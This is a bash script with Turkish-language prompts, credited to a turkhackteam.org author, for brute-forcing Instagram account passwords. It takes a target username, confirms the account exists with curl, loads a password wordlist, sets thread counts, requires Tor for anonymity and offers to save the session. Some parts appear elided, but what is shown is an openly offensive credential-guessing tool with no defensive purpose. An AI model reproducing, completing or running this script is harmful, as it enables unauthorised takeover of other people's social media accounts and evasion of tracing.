#!/bin/bash
# Editor : TheWinson
# Instagram: @thewinsonx
#Site : turkhackteam.org
...
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mLütfen Programı Çalıştırabilmek İçin Yetki Veriniz!\n\e[0m"
    exit 1
fi
}
...
printf "\n"
printf "\e[1;77m\e[45m  Instagram Brute Force / TheWinson - THT   \e[0m\n"
printf "\n"
}
...
#checkroot
dependencies
read -p $'\e[1;92mKullanıcı Adı: \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mKullanıcı Adı Bulunamadı !\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Boş Bırakıp Devam Ediniz): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mHız : (Kullanımı 20 < Normal 10): \e[0m' threads
...
if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mLütfen Tor Ağına Bağlanınız : service tor start\n\e[0m"
exit 1
fi
...
if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] İş kabukları sonlandırılıyor lütfen bekleyiniz...\n\e[0m"
...
default_session="Y"
printf "\n\e[1;77mKullanıcı Kayıt Edilsinmi ?\e[0m\e[1;92m %s \e[0m" $user
...
printf "\e[1;91m[*] BruteForce Durdurmak İçin CTRL + C\n\e[0m"
